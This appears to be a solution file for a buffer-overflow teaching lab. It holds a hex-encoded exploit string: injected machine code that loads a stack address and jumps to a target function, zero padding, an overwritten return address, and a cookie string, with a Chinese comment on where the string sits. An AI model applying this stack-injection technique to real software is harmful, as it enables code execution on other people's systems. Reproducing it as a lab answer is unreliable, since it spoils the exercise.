48 c7 c7 68 41 61 55 68
a7 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
38 41 61 55 00 00 00 00
35 66 66 37 36 32 66 39
00
/*主要是在返回地址之后保存这个字符串，由此避免被覆盖*/
